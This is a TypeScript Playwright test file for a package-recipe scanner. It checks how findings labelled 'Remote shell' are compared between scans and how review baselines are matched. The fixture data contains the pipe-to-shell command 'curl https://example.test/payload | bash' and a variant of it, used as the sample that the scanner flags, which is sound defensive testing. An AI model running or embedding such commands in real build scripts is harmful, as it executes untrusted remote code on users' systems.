import { test, expect } from "@playwright/test";
import { compareRecipeFindings } from "../src/features/packages/recipe-finding-comparison";
import { matchesRecipeReview } from "../src/features/packages/recipe-review-identity";
import type { Finding, RecipeScan, RecipeReviewSummary } from "../src/lib/ipc/bindings";

function scan(lines: string[], locations = [1]): RecipeScan {
  const findings: Finding[] = locations.map((line) => ({
    id: `PKGBUILD:remote-shell-${line}`,
    package: "fixture",
    file: "PKGBUILD",
    line,
    severity: "high",
    title: "Remote shell",
    description: "Inspect downloaded code.",
    confidence: "heuristic",
    installedVersion: null,
    fixedVersion: null,
    cves: [],
    url: null,
  }));
  return {
    staticAnalyzerVersion: 1,
    packageBase: "fixture",
    scannedAt: 100,
    digest: "a".repeat(64),
    commit: "b".repeat(40),
    files: [{ path: "PKGBUILD", role: "build", content: lines.join("\n"), digest: "c".repeat(64) }],
    findings,
    complete: true,
    warnings: [],
    limitations: [],
    url: "https://example.test",
  };
}
const command = "curl https://example.test/payload | bash";

test("finding identity tolerates moved lines while preserving changed command observations", () => {
  const before = scan([command]);
  const after = scan(["# inserted comment", command], [2]);
  const moved = compareRecipeFindings(after, before);
  expect(moved.available && moved.changes.map((change) => change.kind)).toEqual(["retained"]);
  after.files[0]!.content = "# inserted comment\ncurl https://example.test/other | bash";
  const changed = compareRecipeFindings(after, before);
  expect(changed.available && changed.changes.map((change) => change.kind)).toEqual([
    "new",
    "absent",
  ]);
});

test("finding matching counts duplicate occurrences once each and retains empty evidence", () => {
  const before = scan([command, command, command], [1, 2, 3]);
  const after = scan([command, command], [1, 2]);
  const comparison = compareRecipeFindings(after, before);
  expect(comparison.available && comparison.changes.map((change) => change.kind)).toEqual([
    "retained",
    "retained",
    "absent",
  ]);
  const added = compareRecipeFindings(before, after);
  expect(added.available && added.changes.map((change) => change.kind)).toEqual([
    "retained",
    "retained",
    "new",
  ]);
  expect(compareRecipeFindings(scan([], []), scan([], []))).toEqual({
    available: true,
    changes: [],
  });
});

test("finding metadata, exact source bytes, file and rule changes cannot silently match", () => {
  const before = scan([command]);
  const variants: RecipeScan[] = [];
  for (const patch of [
    { severity: "critical" },
    { title: "Different title" },
    { description: "New description" },
    { confidence: "different" },
    { cves: ["CVE-fixture"] },
    { url: "https://example.test/rule" },
    { id: "PKGBUILD:other-rule-1" },
  ]) {
    const after = structuredClone(before);
    Object.assign(after.findings[0]!, patch);
    variants.push(after);
  }
  const whitespace = scan([` ${command}`]);
  variants.push(whitespace);
  const movedFile = structuredClone(before);
  movedFile.files[0]!.path = "fixture.install";
  Object.assign(movedFile.findings[0]!, {
    file: "fixture.install",
    id: "fixture.install:remote-shell-1",
  });
  variants.push(movedFile);
  for (const after of variants) {
    const comparison = compareRecipeFindings(after, before);
    expect(comparison.available && comparison.changes.map((change) => change.kind)).toEqual([
      "new",
      "absent",
    ]);
  }
});

test("legacy, differing, incomplete and mismatched captures never produce comparison counts", () => {
  const before = scan([command]);
  for (const version of [undefined, null, 0, -1, 1.5, 999]) {
    const previous = { ...before, staticAnalyzerVersion: version };
    expect(compareRecipeFindings(before, previous).available).toBe(false);
    if (version !== 999) expect(compareRecipeFindings(previous, previous).available).toBe(false);
  }
  expect(compareRecipeFindings(before, { ...before, complete: false }).available).toBe(false);
  expect(compareRecipeFindings({ ...before, complete: false }, before).available).toBe(false);
  expect(compareRecipeFindings(before, { ...before, packageBase: "other" }).available).toBe(false);
});

test("invalid rules, packages, missing files and out-of-range locations withhold comparison", () => {
  const before = scan([command]);
  for (const patch of [
    { line: null },
    { line: 0 },
    { line: -1 },
    { line: 2 },
    { line: 1.5 },
    { file: "missing.install" },
    { id: "unparseable" },
    { id: "PKGBUILD:-1" },
    { id: "PKGBUILD:remote-shell-2" },
    { package: "other" },
  ]) {
    const after = structuredClone(before);
    Object.assign(after.findings[0]!, patch);
    expect(compareRecipeFindings(after, before).available).toBe(false);
  }
});

test("saved baseline identity rejects another client's replacement including analyzer and timestamps", () => {
  const reviewed = { scan: scan([command]), reviewedAt: 200, note: "Fixture review" };
  const baseline: RecipeReviewSummary = {
    staticAnalyzerVersion: 1,
    packageBase: reviewed.scan.packageBase,
    commit: reviewed.scan.commit,
    digest: reviewed.scan.digest,
    scannedAt: reviewed.scan.scannedAt,
    reviewedAt: reviewed.reviewedAt,
    note: reviewed.note,
    fileCount: 1,
    findingCount: 1,
  };
  expect(matchesRecipeReview(reviewed, baseline)).toBe(true);
  expect(matchesRecipeReview(null, baseline)).toBe(false);
  for (const patch of [
    { commit: "d".repeat(40) },
    { digest: "d".repeat(64) },
    { packageBase: "other" },
    { scannedAt: 101 },
    { reviewedAt: 201 },
    { staticAnalyzerVersion: undefined },
  ])
    expect(matchesRecipeReview(reviewed, { ...baseline, ...patch })).toBe(false);
});
